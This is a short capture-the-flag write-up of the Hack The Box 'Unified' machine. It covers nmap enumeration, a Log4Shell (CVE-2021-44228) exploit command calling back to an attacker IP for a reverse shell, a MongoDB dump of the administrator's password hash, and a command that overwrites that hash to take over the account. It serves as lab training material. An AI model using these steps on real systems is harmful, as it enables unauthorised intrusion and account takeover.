---
title: "HTB — Tier 2 Starting Point: Unified"
published: 2025-07-11
description: ''
image: ''
tags: [HackTheBox]
category: 'CyberSec'
draft: false 
lang: 'en'
---

# Enumeration

## nmap

```plaintext
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.209.113:8443/manage
8443/tcp open  https-alt
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
```

- 22,6789,8080,8443

```plaintext
PORT     STATE    SERVICE         VERSION
22/tcp   open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
1031/tcp filtered iad2
2401/tcp filtered cvspserver
6789/tcp open     ibm-db2-admin?
7103/tcp filtered unknown
8080/tcp open     http            Apache Tomcat (language: en)
8443/tcp open     ssl/nagios-nsca Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Finding Attack Vector

- unified version : 6.4.54
- CVE-2021-44228
- python3 exploit.py -u <https://10.129.209.113:8443> -i 10.10.14.159 -p 4444
- username = michael
- user.txt
  - 6ced1a6a89e666c0****************
- export TERM=xterm
- export TERM=xterm-256color
- <https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation>
- upgrade terminal shell
  - script /dev/null -c bash
- mongodb default database dump
  - mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);`
  - db.admin.find()

```bash
unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
Each(printjson);"7 ace --eval "db.admin.find().forE
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
}

```

- new pass (password)

```plaintext
$6$UwwBFErYxwlTxcc1$pixniPrk2FyE29v2IDRdtSNGhcqf1kpcotZsrx.w3/nr/WgAVd0WjPaeYVAAWqOfS38J6He/bjRJi74rJF07j0
```

- update password
  - db.admin.update()

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$UwwBFErYxwlTxcc1$pixniPrk2FyE29v2IDRdtSNGhcqf1kpcotZsrx.w3/nr/WgAVd0WjPaeYVAAWqOfS38J6He/bjRJi74rJF07j0"}})
```

- root.txt
  - e50bc93c75b634e4****************
